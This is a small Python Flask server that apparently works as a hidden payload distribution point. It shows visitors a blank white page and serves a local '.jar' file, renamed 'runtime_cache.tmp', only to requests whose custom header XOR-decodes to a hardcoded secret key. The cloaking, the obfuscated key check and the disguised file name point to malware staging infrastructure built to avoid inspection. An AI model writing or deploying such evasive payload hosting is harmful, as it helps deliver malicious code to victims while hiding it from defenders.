from flask import Flask, request, send_file, Response
import os

app = Flask(__name__)

MOD_FILE_NAME = ",.jar"
KEY_ONE = "%8_w5^N!H8_d3:I_r$Y-F&sE(mO)£cG_u6^L!M9_y2:Xla%S-J&qnR(wB)£nD_a1^L!N0_x9:Z_v%Y-G&tD(nO)£fH_w6^M!I8_e4:J_s%X-G&uE(mO)£dH_x7^N!J9_f5:K_t%Y-H&vF(nP)£eI_y8^O!K0_g6:L_u%A-I&wG(mQ)£fJ_z9^P!L1_h7:M_v%"
KEY_TWO = "!3a_y%^k$P:x(gS*.-)_)&£R$V8^g!P0_y9:Xla%S-J&qnR(wB)£nD_z0^M!O1_y0:A_w%Z-H&uE(mP)£gI_x7^N!J9_f5:K_t%Y-H&vF(nP)£eI_y8^O!K0_g6:L_u%A-I&wG(mQ)£fJ_z9^P!L1_h7:M_v%B-J&xH(nR)£gK_a0^Q!M2_i8:N_w%"

@app.route('/')
def handle_request():
    auth_token = request.headers.get('X-Custom-Auth', '')
    
    if not auth_token:
        return Response("", mimetype='text/html')
        
    try:
        decrypted_chars = []
        for i in range(len(auth_token)):
            char_code = ord(auth_token[i]) ^ ord(KEY_TWO[i % len(KEY_TWO)])
            decrypted_chars.append(chr(char_code))
        decrypted_str = "".join(decrypted_chars)
        
        if decrypted_str == KEY_ONE:
            if os.path.exists(MOD_FILE_NAME):
                return send_file(
                    MOD_FILE_NAME,
                    mimetype="application/octet-stream",
                    as_attachment=True,
                    download_name="runtime_cache.tmp"
                )
    except:
        pass
    
    blank_white_html = """
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><title></title></head>
    <body style="background-color: white; margin: 0; padding: 0;"></body>
    </html>
    """
    return Response(blank_white_html, mimetype='text/html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
